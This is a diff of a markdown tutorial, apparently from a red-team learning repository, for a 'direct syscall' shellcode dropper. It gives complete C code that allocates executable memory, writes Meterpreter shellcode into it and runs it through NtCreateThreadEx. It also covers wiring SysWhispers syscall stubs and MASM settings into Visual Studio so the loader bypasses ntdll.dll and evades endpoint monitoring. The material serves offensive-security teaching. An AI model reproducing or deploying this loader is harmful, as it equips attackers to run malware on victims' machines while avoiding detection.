@@ -29,6 +29,43 @@ The code works as follows, shellcode declaration is the same as before in both d
 ```
 </details>
 
+The main code of the direct syscall dropper looks like the following and is already implemented in the POC. 
+</details>    
+```
+#include <iostream>
+#include <Windows.h>
+#include "syscalls.h"
+
+int main() {
+    // Insert Meterpreter shellcode
+    unsigned char code[] = "\xfc\x48\x83...";
+
+    // Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
+    // 'exec' will hold the base address of the allocated memory region
+    void* exec = NULL;
+    SIZE_T size = sizeof(code);
+    NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    // Copy the shellcode into the allocated memory region
+    SIZE_T bytesWritten;
+    NtWriteVirtualMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);
+
+    // Execute the shellcode in memory using a new thread
+    // Pass the address of the shellcode as the thread function (StartRoutine) and its parameter (Argument)
+    HANDLE hThread;
+    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), exec, exec, FALSE, 0, 0, 0, NULL);
+
+    // Wait for the end of the thread to ensure the shellcode execution is complete
+    NtWaitForSingleObject(hThread, FALSE, NULL);
+
+
+    // Return 0 as the main function exit code
+    return 0;
+}
+```
+</details>
+
+
 ### Header File
 Unlike the medium level dropper (NTAPIs), we no longer ask ntdll.dll for the function definition of the native APIs we are using. But we still want to use the native functions, so we need to define or implement the structure for all four native functions in a header file. In this case the header file is called syscalls.h and must also be included in the main code. All the structures are already implemented in the direct syscall dropper POC. If you want to check them manually, you should be able to find them in the Microsoft documentation, e.g. for [NtWriteVirtualMemory](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory).
 
@@ -92,52 +129,8 @@ END  ; End of the module
 ```
 </details>
 
-
-
-
-But this time we do not want to run/import the syscalls from ntdll.dll and instead want to implement the functionality directly in the Low-Level-Dropper itself, we have to import the generated files/code from SysWhispers 3 into our Low-Level-Dropper. The syscalls.h provides the structure of the used native APIs NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx and NtWaitForSingleObject and the syscalls-asm.x64.asm contains the corresponding syscalls or syscall stubs. This allows the Low-Level-Dropper to execute syscalls directly without the transition from dropper.exe -> kernel32.dll -> ntdll.dll. Practically, we need to implement the generated code with SysWhispers 3 as follows: 
-
-1. Copy all three files we created with SysWhispers 3 into the directory of your Low-Level-Dropper Visual Studio project.
-<details>
- 
-<p align="center">
-<img width="697" alt="image" src="https://user-images.githubusercontent.com/50073731/235456064-2b124b99-6936-4a96-a878-2e8dd8cdb460.png">
-</details>
-
-    
-2. Add the syscalls.h file to your Low-Level-Dropper project as a header file. 
-<details>
- 
-<p align="center">
-<img width="1269" alt="image" src="https://user-images.githubusercontent.com/50073731/235456468-ffd08548-6f71-4904-821c-6d88580fa3fb.png">
-<img width="599" alt="image" src="https://user-images.githubusercontent.com/50073731/235456549-4385fe3d-4a77-49d7-a153-19e0c5e54cf8.png">
-</details>
-
-3. We also need to include the header syscalls.h as a library in our code. 
-Customisations.
-<details>
- 
-<p align="center">
-<img width="1285" alt="image" src="https://user-images.githubusercontent.com/50073731/235458107-e86178b5-f4f2-4110-a415-d93a08f61373.png">
-</details>
-
-4. Add the syscalls-asm.x64.asm file as a resource file. 
-<details>
- 
-<p align="center">
-<img width="1268" alt="image" src="https://user-images.githubusercontent.com/50073731/235456751-b44a0786-5225-46d7-9ec3-032a6b8ab36c.png">
-<img width="590" alt="image" src="https://user-images.githubusercontent.com/50073731/235456831-138e449f-11ae-4cc6-9483-4073eed67c49.png">
-</details>
-
-5. Add the file syscall.c as source file
-<details>
- 
-<p align="center">
-<img width="1263" alt="image" src="https://user-images.githubusercontent.com/50073731/235457023-473375d1-591d-4479-b47c-2918af056ff2.png">
-<img width="598" alt="image" src="https://user-images.githubusercontent.com/50073731/235457085-bf6775f0-c370-4bb0-b883-db99123b06ca.png">
-</details>
-
-6. To use the assembly code from the syscalls-asm.x64.asm file in Visual Studio, you must enable the Microsoft Macro Assembler (.masm) option in Build Dependencies/Build. Customisations.
+### Microsoft Macro Assembler (MASM)
+We have already implemented all the necessary assembler code in the syscalls.asm file. But in order for the code to be interpreted correctly within the direct syscall POC, we need to do a few things. These steps are not done in the downloadable POC and must be done manually. First, we need to enable the Microsoft Macro Assembler (.masm) option in Build Dependencies/Build Customisations.
 <details>
  
 <p align="center">
@@ -145,53 +138,17 @@ Customisations.
 <img width="590" alt="image" src="https://user-images.githubusercontent.com/50073731/235457782-780d2136-30d7-4e87-a022-687ed2557b33.png">
 </details>
 
-7. Then we need to set the Item Type of the syscalls-asm.x64.asm file to Microsoft Macro Assembler, otherwise we will get an unresolved symbol error in the context of the native APIs used in our Low-Level-Dropper. 
+Furthermore we need to set the Item Type of the syscalls.asm file to Microsoft Macro Assembler, otherwise we will get an unresolved symbol error in the context of the native APIs used in the direct syscall dropper. Furthermore we set Excluded from Build to no and Content to yes. 
 <details>
- 
 <p align="center">
 <img width="950" alt="image" src="https://user-images.githubusercontent.com/50073731/235471947-4bcd23fc-5093-4f4d-adc8-eb3ef36f139f.png">    
 <img width="1237" alt="image" src="https://user-images.githubusercontent.com/50073731/235458968-e330799e-51ff-46bf-97ab-c7d3be7ea079.png">
 <img width="778" alt="image" src="https://user-images.githubusercontent.com/50073731/235459219-4387dc48-56f8-481c-b978-1b786843a836.png">
+</details> 
+
     
-</details>
-
-Here is the **complete code**, and you can copy and paste this code into your **Low-Level-Dropper** project in Visual Studio.
-You can also download the complete **Low-Level-Dropper Visual Studio project** in the **Code Example section** of this repository.
-<details>
     
-```
-#include <iostream>
-#include <Windows.h>
-#include "syscalls.h"
 
-int main() {
-    // Insert Meterpreter shellcode
-    unsigned char code[] = "\xfc\x48\x83...";
-
-    // Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
-    // 'exec' will hold the base address of the allocated memory region
-    void* exec = NULL;
-    SIZE_T size = sizeof(code);
-    NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-
-    // Copy the shellcode into the allocated memory region
-    SIZE_T bytesWritten;
-    NtWriteVirtualMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);
-
-    // Execute the shellcode in memory using a new thread
-    // Pass the address of the shellcode as the thread function (StartRoutine) and its parameter (Argument)
-    HANDLE hThread;
-    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), exec, exec, FALSE, 0, 0, 0, NULL);
-
-    // Wait for the end of the thread to ensure the shellcode execution is complete
-    NtWaitForSingleObject(hThread, FALSE, NULL);
-
-
-    // Return 0 as the main function exit code
-    return 0;
-}
-```
-</details>
 
     
     
